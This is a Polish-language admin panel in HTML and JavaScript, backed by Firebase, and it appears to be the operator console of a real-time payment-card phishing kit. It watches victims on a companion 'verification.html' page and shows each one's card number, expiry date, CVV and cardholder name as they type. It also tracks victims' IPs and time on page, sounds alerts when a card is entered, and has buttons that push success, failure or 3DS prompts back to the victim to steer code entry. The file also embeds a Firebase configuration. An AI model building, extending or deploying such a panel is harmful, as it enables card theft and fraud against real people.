<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin – Monitor Weryfikacji</title>
<style>
* { box-sizing:border-box; margin:0; padding:0; }
body { background:#0f1117; color:#e8eaf0; font-family:'Segoe UI',sans-serif; min-height:100vh; }
.header { background:#161920; border-bottom:1px solid #232733; padding:16px 24px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:100; }
.header h1 { font-size:16px; font-weight:700; color:#fff; }
.header-online { font-size:12px; color:#5a6070; background:#1e2230; border:1px solid #2a2f3e; border-radius:20px; padding:6px 14px; }
.header-online span { color:#00c864; font-weight:700; }
.tabs { display:flex; background:#161920; border-bottom:1px solid #232733; padding:0 24px; position:sticky; top:57px; z-index:99; }
.tab-btn { padding:12px 20px; font-size:13px; font-weight:600; color:#5a6070; background:none; border:none; border-bottom:2px solid transparent; cursor:pointer; font-family:'Segoe UI',sans-serif; margin-bottom:-1px; }
.tab-btn:hover { color:#e8eaf0; }
.tab-btn.active { color:#e8eaf0; border-bottom-color:#00c864; }
.tab-count { display:inline-flex; align-items:center; background:#1e2230; border-radius:10px; font-size:10px; font-weight:700; padding:1px 7px; margin-left:6px; color:#5a6070; }
.tab-btn.active .tab-count { background:rgba(0,200,100,0.15); color:#00c864; }
.container { max-width:540px; margin:32px auto; padding:0 20px 80px; }
.empty-state { text-align:center; padding:60px 20px; color:#3a3f50; font-size:13px; line-height:2; }
.user-block { margin-bottom:16px; }
.user-header { display:flex; align-items:center; justify-content:space-between; padding:14px 18px; background:#161920; border:1px solid #232733; border-radius:12px; cursor:pointer; user-select:none; transition:background 0.15s; }
.user-header:hover { background:#1a1d27; }
.user-header.open { border-radius:12px 12px 0 0; border-bottom-color:#1a1d27; }
.user-header-left { display:flex; align-items:center; gap:10px; }
.user-name { font-size:14px; font-weight:700; color:#e8eaf0; }
.status-pill { display:flex; align-items:center; gap:6px; background:#1e2230; border:1px solid #2a2f3e; border-radius:20px; padding:4px 10px; font-size:12px; font-weight:600; color:#6b7280; transition:all 0.3s; }
.status-pill.online { background:rgba(0,200,100,0.08); border-color:#00c864; color:#00c864; }
.dot { width:8px; height:8px; border-radius:50%; background:#3a3f50; flex-shrink:0; position:relative; }
.dot.on { background:#00c864; }
.dot.on::after { content:''; position:absolute; inset:-3px; border-radius:50%; background:#00c864; opacity:0.25; animation:ping 1.5s ease-out infinite; }
@keyframes ping { 0%{transform:scale(1);opacity:0.25} 100%{transform:scale(2.8);opacity:0} }
.chevron { width:18px; height:18px; flex-shrink:0; fill:#5a6070; transition:transform 0.2s; }
.chevron.open { transform:rotate(180deg); fill:#00c864; }
.del-btn { background:none; border:1px solid #2a2f3e; border-radius:6px; color:#5a6070; font-size:11px; padding:3px 9px; cursor:pointer; font-family:'Segoe UI',sans-serif; }
.del-btn:hover { border-color:#ff4466; color:#ff4466; }
.user-body { display:none; border:1px solid #232733; border-top:none; border-radius:0 0 12px 12px; overflow:hidden; }
.user-body.open { display:block; }
.section { background:#161920; border-bottom:1px solid #1a1d27; }
.section:last-child { border-bottom:none; }
.section-title { padding:11px 20px; font-size:11px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; color:#5a6070; border-bottom:1px solid #1a1d27; }
.row { display:flex; align-items:center; justify-content:space-between; padding:12px 20px; border-bottom:1px solid #1a1d27; gap:12px; }
.row:last-child { border-bottom:none; }
.row-key { font-size:13px; color:#6b7280; flex-shrink:0; }
.row-val { font-size:13px; font-weight:600; color:#4b5263; text-align:right; word-break:break-all; font-style:italic; }
.row-val.filled { color:#e8eaf0; font-style:normal; }
.row-val.ok { color:#00c864; font-style:normal; }
.row-val.err { color:#ff4466; font-style:normal; }
.row-val.warn { color:#ffaa00; font-style:normal; }
.ctrl-section { background:#0f1117; padding:14px 20px; }
.ctrl-label { font-size:11px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; color:#5a6070; margin-bottom:10px; }
.ctrl-lock { display:flex; align-items:center; gap:8px; color:#5a6070; font-size:12px; font-weight:600; padding:4px 0 8px; }
.ctrl-btns { display:flex; gap:8px; flex-wrap:wrap; }
.ctrl-btn { padding:8px 14px; border-radius:8px; border:1px solid #2a2f3e; background:#1e2230; color:#e8eaf0; font-size:12px; font-weight:600; cursor:pointer; font-family:'Segoe UI',sans-serif; transition:all 0.15s; }
.ctrl-btn.success { border-color:#00c864; color:#00c864; }
.ctrl-btn.success:hover { background:rgba(0,200,100,0.1); }
.ctrl-btn.error { border-color:#ff4466; color:#ff4466; }
.ctrl-btn.error:hover { background:rgba(255,68,102,0.1); }
.ctrl-btn.verify { border-color:#4da6ff; color:#4da6ff; }
.ctrl-btn.verify:hover { background:rgba(77,166,255,0.1); }
.hist-item { background:#161920; border:1px solid #232733; border-radius:12px; overflow:hidden; margin-bottom:12px; }
.hist-header { display:flex; align-items:center; justify-content:space-between; padding:13px 18px; cursor:pointer; user-select:none; }
.hist-header:hover { background:#1a1d27; }
.hist-header.open { border-bottom:1px solid #232733; }
.hist-title { font-size:13px; font-weight:700; color:#e8eaf0; }
.hist-meta { font-size:11px; color:#5a6070; margin-top:2px; }
.hist-badge { font-size:10px; font-weight:700; padding:2px 8px; border-radius:10px; background:rgba(0,200,100,0.12); color:#00c864; flex-shrink:0; }
.hist-body { display:none; }
.hist-body.open { display:block; }
.hist-chev { width:16px; height:16px; fill:#5a6070; transition:transform 0.2s; flex-shrink:0; }
.hist-chev.open { transform:rotate(180deg); }
.hist-del { background:none; border:1px solid #2a2f3e; border-radius:6px; color:#5a6070; font-size:11px; padding:2px 8px; cursor:pointer; font-family:'Segoe UI',sans-serif; }
.hist-del:hover { border-color:#ff4466; color:#ff4466; }
.hist-empty { text-align:center; padding:60px 20px; color:#3a3f50; font-size:13px; line-height:2; }
#toast { position:fixed; bottom:24px; left:50%; transform:translateX(-50%); background:#1e2230; border:1px solid #2a2f3e; border-radius:10px; padding:12px 20px; font-size:13px; font-weight:600; display:none; z-index:999; white-space:nowrap; }
</style>
</head>
<body>

<div class="header">
    <h1>Admin <span style="color:#3a3f50;font-weight:400;">/ Monitor Weryfikacji</span></h1>
    <div class="header-online">Online: <span id="onlineCount">0</span></div>
</div>
<div class="tabs">
    <button class="tab-btn active" id="tab-live" onclick="switchTab('live')">Dane na żywo <span class="tab-count" id="cnt-live">0</span></button>
    <button class="tab-btn" id="tab-hist" onclick="switchTab('hist')">Historia <span class="tab-count" id="cnt-hist">0</span></button>
</div>
<div class="container" id="panel-live">
    <div class="empty-state" id="emptyState">Brak użytkowników.<br>Otwórz <strong style="color:#e8eaf0">verification.html</strong> w nowej zakładce.</div>
</div>
<div class="container" id="panel-hist" style="display:none;">
    <div class="hist-empty" id="histEmpty">Brak zakończonych weryfikacji.</div>
</div>
<div id="toast"></div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-app.js";
import { getDatabase, ref, set, remove, onValue } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyBgan9s5dewhyu584M-kZ-IcMw_rXt9isI",
    authDomain: "test-76f44.firebaseapp.com",
    databaseURL: "https://test-76f44-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "test-76f44",
    storageBucket: "test-76f44.firebasestorage.app",
    messagingSenderId: "738546699152",
    appId: "1:738546699152:web:3b2ec6ad7285eb2a264115"
};

const app = initializeApp(firebaseConfig);
const db  = getDatabase(app);

const adminStartTs   = Date.now();
const processedKeys  = new Set();
const users          = {};
const ipToSid        = {};
const sessionState   = {};
const histVerifyTimers = {};
const renderedHist   = new Set();
let   userCounter    = 0;

// ── Nasłuch events ──
onValue(ref(db, 'events'), (snap) => {
    if (!snap.exists()) return;
    snap.forEach(child => {
        const key = child.key;
        const m   = child.val();
        if (!m || !m.t || !m.sid) return;
        if (m.ts && m.ts < adminStartTs) return;
        if (processedKeys.has(key)) return;
        processedKeys.add(key);
        handle(m);
    });
});

// ── Nasłuch sessions ──
let sessionCache = {};
onValue(ref(db, 'sessions'), (snap) => {
    sessionCache = {};
    if (!snap.exists()) { refreshAllHistCtrls(); return; }
    snap.forEach(c => { if (c.val()) sessionCache[c.key] = c.val(); });
    refreshAllHistCtrls();

    snap.forEach(child => {
        const sid = child.key;
        const s   = child.val();
        if (!s) return;
        if (s.ts && s.ts < adminStartTs) return;

        if (!sessionState[sid]) {
            sessionState[sid] = {};
            const ip = s.ip;
            if (ip && ipToSid[ip] && ipToSid[ip] !== sid) {
                // Odświeżenie — ten sam IP
                const orig = ipToSid[ip];
                if (users[orig]) showToast('🔄 ' + users[orig].name + ' odświeżył stronę', '#f59e0b');
                handle({ sid: orig, ts: s.ts || adminStartTs, t: 'online' });
                return;
            }
            if (ip) ipToSid[ip] = sid;
            handle({ sid, ts: s.ts || adminStartTs, t: 'online' });
        }

        const base = { sid, ts: s.ts || adminStartTs };
        ['method','modal','cardnum','cardexp','cardcvv','cardname','confirm','tab','verify_start'].forEach(f => {
            if (s[f] !== undefined && s[f] !== sessionState[sid][f]) {
                sessionState[sid][f] = s[f];
                handle(Object.assign({}, base, { t: f, v: s[f] }));
            }
        });
        if (s.verifybtn && s.verifybtn !== sessionState[sid].verifybtn) {
            sessionState[sid].verifybtn = s.verifybtn;
            handle(Object.assign({}, base, { t: 'verifybtn' }));
        }
        // Online/offline z isOnline
        if (s.isOnline !== undefined && s.isOnline !== sessionState[sid].isOnline) {
            sessionState[sid].isOnline = s.isOnline;
            handle(Object.assign({}, base, { t: s.isOnline ? 'online' : 'offline' }));
        }
    });
});

// ── Historia ──
onValue(ref(db, 'history'), (snap) => {
    const entries = [];
    if (snap.exists()) snap.forEach(c => entries.push(c.val()));
    entries.sort((a,b) => (a.ts||0)-(b.ts||0));
    entries.forEach(e => e && e.hid && renderHist(e));
});

// ── Obsługa eventów ──
function handle(m) {
    const sid = m.sid;
    if (!users[sid]) {
        if (m.t === 'hb') return;
        createUser(sid);
    }
    const u = users[sid];
    clearTimeout(u.hbTimer);
    u.hbTimer = setTimeout(() => setOnline(sid, false), 7000);

    if (m.t === 'online') {
        setOnline(sid, true);
        if (!u.greeted) { u.greeted = true; showToast('🟢 ' + u.name + ' wszedł na stronę', '#00c864'); beep('arrive'); }
        return;
    }
    if (m.t === 'hb')      { setOnline(sid, true); return; }
    if (m.t === 'offline') { setOnline(sid, false); return; }
    if (m.t === 'tab')     { setVal(sid,'tab', m.v, m.v==='aktywna'?'ok':'warn'); setLast(sid); return; }

    if (m.t === 'method')   setVal(sid,'method',  m.v, 'filled');
    if (m.t === 'modal')    { unlockCtrl(sid); setVal(sid,'modal', 'Otwarto o '+now(), 'ok'); }
    if (m.t === 'cardnum')  { unlockCtrl(sid); setVal(sid,'cardnum',  m.v, 'filled'); }
    if (m.t === 'cardexp')  setVal(sid,'cardexp',  m.v, 'filled');
    if (m.t === 'cardcvv')  setVal(sid,'cardcvv',  m.v, 'filled');
    if (m.t === 'cardname') setVal(sid,'cardname', m.v, 'filled');
    if (m.t === 'confirm')  { setVal(sid,'confirm', m.v+' ('+now()+')', 'ok'); showToast('✅ '+u.name+' potwierdził!','#00c864'); beep('pay'); }
    if (m.t === 'verifybtn') { setVal(sid,'btn','kliknięto ('+now()+')','warn'); showToast('🔐 '+u.name+' kliknął ZWERYFIKUJ!','#ffaa00'); beep('pay'); }
    if (m.t === 'verify_start') refreshAllHistCtrls();

    setLast(sid);
}

function createUser(sid) {
    document.getElementById('emptyState').style.display = 'none';
    userCounter++;
    const name = 'Użytkownik ' + userCounter;
    const block = document.createElement('div');
    block.className = 'user-block'; block.id = 'block-'+sid;
    block.innerHTML = `
      <div class="user-header" id="hdr-${sid}" onclick="toggleUser('${sid}')">
        <div class="user-header-left">
          <div class="dot" id="dot-${sid}"></div>
          <span class="user-name">${name}</span>
          <div class="status-pill" id="pill-${sid}"><span id="pilltxt-${sid}">OFFLINE</span></div>
        </div>
        <div style="display:flex;align-items:center;gap:8px;">
          <button class="del-btn" onclick="event.stopPropagation();deleteUser('${sid}')">Usuń</button>
          <svg class="chevron" id="chev-${sid}" viewBox="0 0 24 24"><path d="M7.165 8.153a1.07 1.07 0 0 0-1.507-.078A1.063 1.063 0 0 0 5.58 9.58l5.672 6.27a1.07 1.07 0 0 0 1.587-.002l5.583-6.217a1.06 1.06 0 0 0-.083-1.503 1.07 1.07 0 0 0-1.507.083l-4.37 4.865a.57.57 0 0 1-.843.002z"/></svg>
        </div>
      </div>
      <div class="user-body" id="body-${sid}">
        <div class="section">
          <div class="section-title">Aktywność</div>
          <div class="row"><span class="row-key">Wybrana metoda</span>      <span class="row-val" id="${sid}-method">–</span></div>
          <div class="row"><span class="row-key">Przycisk ZWERYFIKUJ</span> <span class="row-val" id="${sid}-btn">–</span></div>
        </div>
        <div class="section">
          <div class="section-title">Dane karty</div>
          <div class="row"><span class="row-key">Modal otwarty</span>   <span class="row-val" id="${sid}-modal">–</span></div>
          <div class="row"><span class="row-key">Numer karty</span>     <span class="row-val" id="${sid}-cardnum">–</span></div>
          <div class="row"><span class="row-key">Data ważności</span>   <span class="row-val" id="${sid}-cardexp">–</span></div>
          <div class="row"><span class="row-key">CVV</span>             <span class="row-val" id="${sid}-cardcvv">–</span></div>
          <div class="row"><span class="row-key">Imię na karcie</span>  <span class="row-val" id="${sid}-cardname">–</span></div>
          <div class="row"><span class="row-key">Potwierdzenie</span>   <span class="row-val" id="${sid}-confirm">–</span></div>
        </div>
        <div class="section">
          <div class="section-title">Sesja</div>
          <div class="row"><span class="row-key">Status zakładki</span>    <span class="row-val" id="${sid}-tab">–</span></div>
          <div class="row"><span class="row-key">Czas na stronie</span>    <span class="row-val filled" id="${sid}-time">0s</span></div>
          <div class="row"><span class="row-key">Ostatnia aktywność</span> <span class="row-val" id="${sid}-last">–</span></div>
        </div>
        <div class="ctrl-section">
          <div class="ctrl-label">🎮 Sterowanie</div>
          <div id="${sid}-ctrl-lock" class="ctrl-lock">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><rect x="5" y="11" width="14" height="10" rx="2" stroke="#5a6070" stroke-width="1.8"/><path d="M8 11V7a4 4 0 0 1 8 0v4" stroke="#5a6070" stroke-width="1.8" stroke-linecap="round"/></svg>
            Oczekiwanie na formularz karty...
          </div>
          <div id="${sid}-ctrl-btns" style="display:none;" class="ctrl-btns">
            <button class="ctrl-btn success" onclick="sendCtrl('${sid}','card_ok')">✅ Sukces</button>
            <button class="ctrl-btn error"   onclick="sendCtrl('${sid}','card_fail')">❌ Błąd</button>
            <button class="ctrl-btn verify"  onclick="sendCtrl('${sid}','card_3ds')">🔐 3DS</button>
          </div>
        </div>
      </div>
    `;
    document.getElementById('panel-live').prepend(block);
    updateLiveCount();
    users[sid] = { name, block, hbTimer:null, greeted:false, sessionStart:Date.now(), timerInterval: setInterval(()=>tickTime(sid),1000) };
    updateOnlineCount();
}

function unlockCtrl(sid) {
    const lock = document.getElementById(sid+'-ctrl-lock');
    const btns = document.getElementById(sid+'-ctrl-btns');
    if (lock) lock.style.display = 'none';
    if (btns) btns.style.display = 'flex';
}
function setVal(sid, field, val, cls) {
    const el = document.getElementById(sid+'-'+field);
    if (!el) return;
    el.textContent = val;
    el.className = 'row-val'+(cls?' '+cls:'');
}
function setLast(sid) { setVal(sid,'last',now(),'filled'); }
function setOnline(sid, v) {
    const dot=document.getElementById('dot-'+sid), pill=document.getElementById('pill-'+sid), txt=document.getElementById('pilltxt-'+sid);
    if (!dot) return;
    dot.className = 'dot'+(v?' on':'');
    pill.className = 'status-pill'+(v?' online':'');
    txt.textContent = v ? 'ONLINE' : 'OFFLINE';
    if (!v) setVal(sid,'tab','offline','err');
    updateOnlineCount();
}
function tickTime(sid) {
    const u=users[sid]; if (!u) return;
    const s=Math.round((Date.now()-u.sessionStart)/1000);
    const el=document.getElementById(sid+'-time');
    if (el) el.textContent = Math.floor(s/60)>0 ? Math.floor(s/60)+'m '+(s%60)+'s' : s+'s';
}
function updateOnlineCount() {
    document.getElementById('onlineCount').textContent = Object.keys(users).filter(sid=>document.getElementById('dot-'+sid)?.classList.contains('on')).length;
}
function updateLiveCount() {
    document.getElementById('cnt-live').textContent = document.querySelectorAll('#panel-live .user-block').length;
}

// Sterowanie
window.sendCtrl = function(sid, action) {
    // Znajdź najnowszy aktywny SID z tego samego IP
    let activeSid = sid;
    const ip = Object.keys(ipToSid).find(k => ipToSid[k] === sid);
    if (ip) {
        let latestTs = 0;
        Object.entries(sessionCache).forEach(([s,data]) => {
            if (data.ip===ip && (data.ts||0)>latestTs && data.isOnline!==false) { latestTs=data.ts||0; activeSid=s; }
        });
    }
    set(ref(db,'ctrl/'+activeSid), { action, ts:Date.now() });
    const colors = {card_ok:'#00c864',card_fail:'#ff4466',card_3ds:'#4da6ff'};
    const labels = {card_ok:'✅ Wysłano: Sukces',card_fail:'❌ Wysłano: Błąd',card_3ds:'🔐 Wysłano: 3DS'};
    showToast(labels[action]||action, colors[action]||'#e8eaf0');
};

window.toggleUser = function(sid) {
    const body=document.getElementById('body-'+sid), hdr=document.getElementById('hdr-'+sid), chev=document.getElementById('chev-'+sid);
    const open=body.classList.contains('open');
    body.classList.toggle('open',!open); hdr.classList.toggle('open',!open); chev.classList.toggle('open',!open);
};
window.deleteUser = function(sid) {
    const u=users[sid]; if (!u) return;
    clearTimeout(u.hbTimer); clearInterval(u.timerInterval);
    u.block.remove(); delete users[sid];
    updateOnlineCount(); updateLiveCount();
    if (!Object.keys(users).length) document.getElementById('emptyState').style.display='';
};

// Historia
function renderHist(entry) {
    const hid=entry.hid;
    if (!hid || renderedHist.has(hid)) return;
    renderedHist.add(hid);
    document.getElementById('histEmpty').style.display='none';
    const sid=entry.sid;
    const item=document.createElement('div');
    item.className='hist-item'; item.id='hist-'+hid;
    item.innerHTML=`
      <div class="hist-header" onclick="toggleHist('${hid}')">
        <div>
          <div style="display:flex;align-items:center;gap:8px;">
            <span class="hist-title">${entry.userName||'Użytkownik'}</span>
            <span class="hist-badge">${entry.method||'Karta'}</span>
          </div>
          <div class="hist-meta">${entry.confirm||''}</div>
        </div>
        <div style="display:flex;align-items:center;gap:8px;">
          <button class="hist-del" onclick="event.stopPropagation();deleteHist('${hid}')">Usuń</button>
          <svg class="hist-chev" id="hchev-${hid}" viewBox="0 0 24 24"><path d="M7.165 8.153a1.07 1.07 0 0 0-1.507-.078A1.063 1.063 0 0 0 5.58 9.58l5.672 6.27a1.07 1.07 0 0 0 1.587-.002l5.583-6.217a1.06 1.06 0 0 0-.083-1.503 1.07 1.07 0 0 0-1.507.083l-4.37 4.865a.57.57 0 0 1-.843.002z"/></svg>
        </div>
      </div>
      <div class="hist-body" id="hbody-${hid}">
        <div class="section">
          <div class="section-title">Dane karty</div>
          <div class="row"><span class="row-key">Numer karty</span>   <span class="row-val filled">${entry.cardnum||'–'}</span></div>
          <div class="row"><span class="row-key">Data ważności</span> <span class="row-val filled">${entry.cardexp||'–'}</span></div>
          <div class="row"><span class="row-key">CVV</span>           <span class="row-val filled">${entry.cardcvv||'–'}</span></div>
          <div class="row"><span class="row-key">Imię na karcie</span><span class="row-val filled">${entry.cardname||'–'}</span></div>
          <div class="row"><span class="row-key">Potwierdzenie</span> <span class="row-val ok">${entry.confirm||''}</span></div>
        </div>
        <div class="ctrl-section">
          <div class="ctrl-label">🎮 Sterowanie</div>
          <div id="hctrl-status-${hid}" style="font-size:12px;color:#f59e0b;font-weight:600;margin-bottom:10px;">⏳ Sprawdzanie...</div>
          <div id="hctrl-btns-${hid}" class="ctrl-btns">
            <button class="ctrl-btn success" onclick="sendCtrl('${sid}','card_ok')">✅ Sukces</button>
            <button class="ctrl-btn error"   onclick="sendCtrl('${sid}','card_fail')">❌ Błąd</button>
            <button class="ctrl-btn verify"  onclick="sendCtrl('${sid}','card_3ds')">🔐 3DS</button>
          </div>
        </div>
      </div>
    `;
    document.getElementById('panel-hist').prepend(item);
    document.getElementById('cnt-hist').textContent = document.querySelectorAll('#panel-hist .hist-item').length;
    window._histSids = window._histSids || {};
    window._histSids[hid] = sid;
    updateHistCtrl(hid, sid);
}

function updateHistCtrl(hid, sid) {
    const statusEl = document.getElementById('hctrl-status-'+hid);
    if (!statusEl) return;
    const session = sessionCache[sid];
    if (!session || !session.isOnline) {
        // Szukaj nowszego SID z tym samym IP
        const ip = session && session.ip;
        if (ip) {
            let latestTs=0, newerSid=null;
            Object.entries(sessionCache).forEach(([s,data])=>{
                if (data.ip===ip && (data.ts||0)>latestTs && data.isOnline && s!==sid) { latestTs=data.ts||0; newerSid=s; }
            });
            if (newerSid) { window._histSids[hid]=newerSid; updateHistCtrl(hid,newerSid); return; }
        }
        statusEl.innerHTML='<span style="color:#ff4466;">⚠️ Sesja nieaktywna</span>';
        return;
    }
    const verifyTs = session.verify_start;
    const modal    = session.modal;
    if (verifyTs) {
        startHistVerifyTimer(hid, verifyTs);
    } else if (!modal) {
        statusEl.innerHTML='<span style="color:#f59e0b;">⏳ Formularz nie jest otwarty</span>';
        stopHistVerifyTimer(hid);
    } else {
        statusEl.innerHTML='<span style="color:#00c864;">✅ Formularz otwarty</span>';
        stopHistVerifyTimer(hid);
    }
}

function refreshAllHistCtrls() {
    Object.entries(window._histSids||{}).forEach(([hid,sid])=>updateHistCtrl(hid,sid));
}

function startHistVerifyTimer(hid, ts) {
    if (histVerifyTimers[hid]&&histVerifyTimers[hid].ts===ts) return;
    stopHistVerifyTimer(hid);
    const DURATION=300;
    const statusEl=document.getElementById('hctrl-status-'+hid);
    function tick(){
        const seconds=Math.max(0,DURATION-Math.floor((Date.now()-ts)/1000));
        const mm=Math.floor(seconds/60), ss=seconds%60;
        const color=seconds>60?'#4da6ff':seconds>30?'#f59e0b':'#ff4466';
        if(statusEl) statusEl.innerHTML=`<span style="color:${color};">🔐 3DS: ${mm}:${String(ss).padStart(2,'0')}</span>`;
        if(seconds<=0){stopHistVerifyTimer(hid);if(statusEl)statusEl.innerHTML='<span style="color:#ff4466;">⌛ Czas minął</span>';}
    }
    tick(); histVerifyTimers[hid]={interval:setInterval(tick,1000),ts};
}
function stopHistVerifyTimer(hid) {
    if(histVerifyTimers[hid]){clearInterval(histVerifyTimers[hid].interval);delete histVerifyTimers[hid];}
}

window.toggleHist = function(hid) {
    const hdr=document.querySelector('#hist-'+hid+' .hist-header'), body=document.getElementById('hbody-'+hid), chev=document.getElementById('hchev-'+hid);
    const open=body.classList.contains('open');
    body.classList.toggle('open',!open); hdr.classList.toggle('open',!open); chev.classList.toggle('open',!open);
};
window.deleteHist = function(hid) {
    document.getElementById('hist-'+hid)?.remove();
    renderedHist.delete(hid);
    remove(ref(db,'history/'+hid));
    document.getElementById('cnt-hist').textContent=document.querySelectorAll('#panel-hist .hist-item').length;
    if(!document.querySelectorAll('#panel-hist .hist-item').length) document.getElementById('histEmpty').style.display='';
};

window.switchTab = function(tab) {
    document.getElementById('panel-live').style.display=tab==='live'?'':'none';
    document.getElementById('panel-hist').style.display=tab==='hist'?'':'none';
    document.getElementById('tab-live').classList.toggle('active',tab==='live');
    document.getElementById('tab-hist').classList.toggle('active',tab==='hist');
};

function now() { return new Date().toLocaleTimeString('pl-PL',{hour:'2-digit',minute:'2-digit',second:'2-digit'}); }
let toastTimer;
function showToast(msg,color) {
    const el=document.getElementById('toast');
    el.textContent=msg; el.style.color=color||'#e8eaf0'; el.style.borderColor=color||'#2a2f3e'; el.style.display='block';
    clearTimeout(toastTimer); toastTimer=setTimeout(()=>el.style.display='none',3500);
}
function beep(type) {
    try {
        const ctx=new(window.AudioContext||window.webkitAudioContext)();
        if(type==='arrive'){const o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);o.frequency.setValueAtTime(660,ctx.currentTime);o.frequency.exponentialRampToValueAtTime(1100,ctx.currentTime+0.2);g.gain.setValueAtTime(0.15,ctx.currentTime);g.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+0.4);o.start();o.stop(ctx.currentTime+0.4);}
        else{[0,0.12,0.24].forEach((d,i)=>{const o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);o.frequency.value=[550,770,990][i];g.gain.setValueAtTime(0.15,ctx.currentTime+d);g.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+d+0.25);o.start(ctx.currentTime+d);o.stop(ctx.currentTime+d+0.25);});}
    } catch(e){}
}
</script>
